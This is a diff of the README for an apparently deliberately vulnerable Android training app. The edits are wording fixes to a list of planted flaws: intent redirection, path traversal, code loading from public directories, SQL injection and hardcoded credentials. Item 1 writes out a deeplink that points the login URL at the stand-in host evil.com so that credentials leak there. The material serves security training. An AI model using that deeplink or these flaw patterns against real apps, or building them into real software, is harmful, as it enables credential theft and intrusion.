@@ -6,9 +6,9 @@ This section only includes the list of vulnerabilities, without a detailed descr
 
 ### Deeplinks, intents and component launches
 
-1. Installation of an arbitrary `login_url` via deeplink `oversecured://ovaa/login?url=http://evil.com/`. Leads to the user's user name and password being leaked when they log in.
+1. Installation of an arbitrary `login_url` via deeplink `oversecured://ovaa/login?url=http://evil.com/`. Leads to the user's username and password being leaked when they log in.
 2. Obtaining access to arbitrary content providers (not exported, but with the attribute `android:grantUriPermissions="true"`) via deeplink `oversecured://ovaa/grant_uri_permissions`. The attacker's app needs to process `oversecured.ovaa.action.GRANT_PERMISSIONS` and pass intent to `setResult(code, intent)` with flags such as `Intent.FLAG_GRANT_READ_URI_PERMISSION` and the URI of the content provider.
-3. Access to arbitrary activities and acquiring access to arbitrary content providers in `LoginActivity` by supplying an arbitrary Intent object to `redirect_intent`.
+3. Access to arbitrary activities and to arbitrary content providers in `LoginActivity` by supplying an arbitrary `Intent` object to `redirect_intent`.
 4. Intent redirection in `IntentVulnActivity` from the `forward_intent` extra and from `Intent.parseUri`.
 5. Launching an attacker-configured component in `IntentVulnActivity` (package, class and action from extras).
 6. Starting an attacker-named `Fragment` in `IntentVulnActivity`.
@@ -28,8 +28,8 @@ This section only includes the list of vulnerabilities, without a detailed descr
 ### Theft and overwriting of files
 
 16. Theft of arbitrary files in `MainActivity` by intercepting an activity launch from `Intent.ACTION_PICK` and passing the URI to any file as data.
-17. Obtaining read/write access to arbitrary files in `TheftOverwriteProvider` via path-traversal in the value `uri.getLastPathSegment()`.
-18. Use of very wide file sharing declaration for `oversecured.ovaa.fileprovider` content provider in `root` entry.
+17. Obtaining read/write access to arbitrary files in `TheftOverwriteProvider` via path traversal in the value of `uri.getLastPathSegment()`.
+18. Use of a very wide file sharing declaration for the `oversecured.ovaa.fileprovider` content provider in its `root` entry.
 19. Copying private files to external storage and attacker-named directories in `FileAccessActivity`, plus overwriting, corrupting and deleting an attacker-supplied path.
 20. World-readable and world-writable modes on attacker-supplied paths in `FileAccessActivity` and on executables in `CodeExecActivity`.
 21. Theft of the file behind an activity result in `ResultTheftActivity`.
@@ -58,7 +58,7 @@ This section only includes the list of vulnerabilities, without a detailed descr
 
 ### Code execution
 
-35. Arbitrary Code Execution in `OversecuredApplication` by launching code from third-party apps with no security checks.
+35. Arbitrary code execution in `OversecuredApplication` by launching code from third-party apps with no security checks.
 36. Arbitrary code execution via a DEX library located in a world-readable/writable directory.
 37. DEX and native library loading in `CodeExecActivity` from public directories and attacker-supplied paths, and class loading from a third-party package context.
 38. Reflection calls and field writes in `CodeExecActivity` with class, method, field and value from extras.
@@ -79,7 +79,7 @@ This section only includes the list of vulnerabilities, without a detailed descr
 
 45. SQL injection in `StorageActivity` via `rawQuery`, `execSQL` and a `query` selection.
 46. Password storage in shared preferences, arbitrary preference files read and written, and world-accessible preferences in `StorageActivity`.
-47. Session data on the SD card and non-media data in external storage, in `FileAccessActivity`.
+47. Session data written to the SD card and non-media data written to external storage in `FileAccessActivity`.
 
 ### Device control
 
@@ -88,7 +88,7 @@ This section only includes the list of vulnerabilities, without a detailed descr
 
 ### Configuration and secrets
 
-50. Hardcoded credentials to a dev environment endpoint in `strings.xml` in `test_url` entry.
+50. Hardcoded credentials to a dev environment endpoint in the `test_url` entry of `strings.xml`.
 51. Manifest issues: `debuggable`, `allowBackup` and `usesCleartextTraffic` all true, custom permissions at `normal` and `dangerous` levels, `protectionLevel` on a component, exported components, an `android_secret_code` receiver, unused permissions.
 
 
